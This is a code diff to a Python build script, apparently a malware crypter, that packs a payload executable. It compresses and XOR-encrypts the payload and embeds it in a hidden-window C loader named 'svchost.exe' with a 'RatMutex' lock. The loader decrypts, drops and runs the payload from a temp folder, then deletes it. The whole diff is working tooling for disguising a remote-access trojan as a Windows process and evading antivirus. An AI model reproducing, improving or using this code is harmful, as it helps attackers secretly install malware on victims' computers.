@@ -1,4 +1,4 @@
-# build.py - Сборка EXE с зашифрованной DLL (ПРОСТАЯ ВЕРСИЯ)
+# build.py - БЫСТРАЯ СБОРКА (без DLL конвертации)
 import os
 import sys
 import subprocess
@@ -64,24 +64,53 @@ class StealthBuilder:
         print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
         return "payload.exe"
     
-    def convert_exe_to_dll(self, exe_path):
-        print("[+] Converting EXE to DLL...")
+    def encrypt_and_build(self, exe_path):
+        """Шифрует EXE и создает загрузчик (БЕЗ DLL)"""
+        print("[+] Encrypting EXE...")
         
         with open(exe_path, 'rb') as f:
             exe_data = f.read()
         
-        # ПРОСТОЙ C код БЕЗ комментариев и спецсимволов
-        dll_code = '''
+        # Сжимаем
+        compressed = zlib.compress(exe_data, level=9)
+        
+        # XOR шифруем
+        encrypted = bytearray(compressed)
+        for i in range(len(encrypted)):
+            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
+        
+        # Сохраняем зашифрованные данные
+        with open('encrypted.bin', 'wb') as f:
+            f.write(encrypted)
+        
+        # Сохраняем ключ
+        with open('key.bin', 'wb') as f:
+            f.write(self.xor_key)
+        
+        size_mb = len(encrypted) / (1024*1024)
+        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
+        
+        # Создаем загрузчик
+        print("[+] Creating loader...")
+        
+        loader_code = '''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-static unsigned char exe_data[] = {
-DATA
-};
-static unsigned int exe_size = SIZE;
+extern unsigned char _binary_encrypted_bin_start[];
+extern unsigned char _binary_encrypted_bin_end[];
+extern unsigned char _binary_key_bin_start[];
+extern unsigned char _binary_key_bin_end[];
 
-static void RunEXE() {
+static void xor_decrypt(unsigned char* data, size_t len, 
+                        unsigned char* key, size_t key_len) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= key[i % key_len];
+    }
+}
+
+static void RunEXE(unsigned char* exe_data, size_t exe_size) {
     char temp_path[MAX_PATH];
     char exe_path[MAX_PATH];
     DWORD written;
@@ -111,103 +140,34 @@ static void RunEXE() {
     DeleteFileA(exe_path);
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
-    if (reason == DLL_PROCESS_ATTACH) {
-        DisableThreadLibraryCalls(hModule);
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunEXE, NULL, 0, NULL);
-    }
-    return TRUE;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+                   LPSTR lpCmdLine, int nCmdShow) {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
+    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
+    
+    size_t dll_len = _binary_encrypted_bin_end - _binary_encrypted_bin_start;
+    size_t key_len = _binary_key_bin_end - _binary_key_bin_start;
+    
+    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
+    if (!decrypted) return 1;
+    
+    memcpy(decrypted, _binary_encrypted_bin_start, dll_len);
+    
+    xor_decrypt(decrypted, dll_len, _binary_key_bin_start, key_len);
+    
+    RunEXE(decrypted, dll_len);
+    
+    free(decrypted);
+    
+    while (1) Sleep(10000);
+    
+    return 0;
 }
 '''
-        # Конвертируем EXE в HEX строку
-        hex_parts = []
-        for i, b in enumerate(exe_data):
-            if i > 0 and i % 16 == 0:
-                hex_parts.append('\n    ')
-            hex_parts.append(f'0x{b:02X}, ')
-        
-        hex_string = ''.join(hex_parts).rstrip(', ')
-        
-        # Заменяем плейсхолдеры
-        final_code = dll_code.replace('DATA', hex_string)
-        final_code = final_code.replace('SIZE', str(len(exe_data)))
-        
-        # Сохраняем в ASCII (без UTF-8)
-        with open('payload_dll.c', 'w', encoding='ascii', errors='ignore') as f:
-            f.write(final_code)
-        
-        cmd = [
-            'gcc', '-shared', '-o', 'payload.dll',
-            'payload_dll.c',
-            '-static', '-s', '-O2',
-            '-Wl,--subsystem,windows',
-            '-luser32', '-lkernel32'
-        ]
-        
-        result = subprocess.run(cmd, capture_output=True)
-        if result.returncode != 0:
-            print(f"[-] DLL compilation error: {result.stderr.decode()}")
-            return None
-            
-        size_mb = os.path.getsize('payload.dll') / (1024*1024)
-        print(f"[+] DLL ready! Size: {size_mb:.1f} MB")
-        return "payload.dll"
-    
-    def encrypt_dll(self, dll_path):
-        print("[+] Encrypting DLL...")
-        
-        with open(dll_path, 'rb') as f:
-            dll_data = f.read()
-        
-        compressed = zlib.compress(dll_data, level=9)
-        
-        encrypted = bytearray(compressed)
-        for i in range(len(encrypted)):
-            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
-        
-        size_mb = len(encrypted) / (1024*1024)
-        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
-        return encrypted
-    
-    def bytes_to_c_array(self, data, name):
-        result = f'unsigned char {name}[] = {{\n    '
-        for i, b in enumerate(data):
-            if i > 0:
-                result += ', '
-            result += f'0x{b:02X}'
-            if (i + 1) % 16 == 0:
-                result += ',\n    '
-        result += '\n};\n'
-        return result
-    
-    def build_loader(self, encrypted_dll):
-        print("[+] Building loader...")
-        
-        with open('loader.cpp', 'rb') as f:
-            loader = f.read().decode('ascii', errors='ignore')
-        
-        encrypted_array = self.bytes_to_c_array(encrypted_dll, 'encrypted_dll')
-        key_array = self.bytes_to_c_array(self.xor_key, 'xor_key')
-        
-        loader = loader.replace(
-            'extern unsigned char encrypted_dll[];',
-            encrypted_array
-        )
-        loader = loader.replace(
-            'extern unsigned int dll_len;',
-            f'unsigned int dll_len = {len(encrypted_dll)};'
-        )
-        loader = loader.replace(
-            'extern unsigned char xor_key[];',
-            key_array
-        )
-        loader = loader.replace(
-            'extern unsigned int key_len;',
-            f'unsigned int key_len = {len(self.xor_key)};'
-        )
-        
-        with open('loader_final.cpp', 'w', encoding='ascii', errors='ignore') as f:
-            f.write(loader)
+        with open('loader_final.cpp', 'w') as f:
+            f.write(loader_code)
         
         print("[+] Loader ready!")
         return 'loader_final.cpp'
@@ -219,6 +179,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
             'g++',
             '-o', 'svchost.exe',
             loader_path,
+            'encrypted.bin',
+            'key.bin',
             '-static',
             '-s',
             '-O1',
@@ -251,15 +213,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         if not exe:
             return False
         
-        dll = self.convert_exe_to_dll(exe)
-        if not dll:
-            return False
-        
-        encrypted = self.encrypt_dll(dll)
-        if not encrypted:
-            return False
-        
-        loader = self.build_loader(encrypted)
+        loader = self.encrypt_and_build(exe)
         if not loader:
             return False
         
